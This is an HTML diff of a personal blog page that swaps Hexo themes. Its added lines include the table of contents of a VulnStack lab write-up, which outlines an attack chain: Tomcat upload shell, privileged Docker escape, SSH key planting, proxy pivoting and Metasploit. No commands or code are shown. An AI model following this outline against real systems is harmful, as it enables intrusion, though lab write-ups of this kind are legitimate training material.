-  appId:'Bnr1wLZ3jY69sAXABKBTt5TO-gzGzoHsz',
-  appKey:'loLNR3sesNkuhCMjtzlb2g1d',
-  placeholder:'请你不要 diss 我',
-  avatar:'monsterid',
-  guest_info:guest_info,
-  pageSize:'10',
-  lang: 'zh-cn'
-})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2022 - 2024 By 山野人</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://github.com/Yllxx03">Github</a>!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
-  $('#nav').addClass('is-mobile')
-  $('footer').addClass('is-mobile')
-  $('#top-container').addClass('is-mobile')
-}</script></body></html>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2024/09/21/VulnStack-ATT&CK-3/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-09-21 16:46:02
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2024/09/21/VulnStack-ATT&CK-5/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0GetShell"><span class="toc-text">Tomcat漏洞文件上传GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8"><span class="toc-text">Docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BADocker%E7%8E%AF%E5%A2%83"><span class="toc-text">判断是否为Docker环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-text">特权模式逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90ssh-key"><span class="toc-text">生成ssh key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAkey-sh"><span class="toc-text">创建key.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%B8%8B%E8%BD%BDkey-sh"><span class="toc-text">靶机下载key.sh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kali%E8%BF%9E%E6%8E%A5%E9%9D%B6%E6%9C%BA"><span class="toc-text">kali连接靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F"><span class="toc-text">注意</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF"><span class="toc-text">查网卡信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">内网主机探测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-text">配置代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="toc-text">文件配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%88%B0%E9%9D%B6%E6%9C%BA"><span class="toc-text">上传到靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%8B%E4%BA%88%E6%9D%83%E9%99%90%E3%80%81%E5%90%AF%E5%8A%A8"><span class="toc-text">赋予权限、启动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AEproxychains"><span class="toc-text">配置proxychains</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">内网主机端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">MSF漏洞利用</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + VulnStack-ATT%26CK-4 + '&url=' + http%3A%2F%2Flxy00.top%2F2024%2F09%2F21%2FVulnStack-ATT%26CK-4%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://lxy00.top/2024/09/21/VulnStack-ATT&CK-4/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
